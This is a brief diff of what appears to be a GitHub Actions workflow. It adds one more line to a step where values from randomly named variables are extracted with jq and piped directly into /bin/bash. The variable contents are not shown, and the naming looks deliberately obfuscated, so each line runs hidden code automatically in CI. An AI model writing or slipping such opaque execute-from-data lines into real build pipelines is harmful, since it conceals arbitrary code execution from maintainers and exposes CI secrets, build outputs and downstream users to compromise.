@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$ngjf9382" | jq -r .niwa58 | /bin/bash
           echo $z7 | jq -r .zeutv0 | /bin/bash
           echo $jnq3815 | jq -r .a7646 | /bin/bash
+          printf '%s' "$cj3" | jq -r .rhd9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
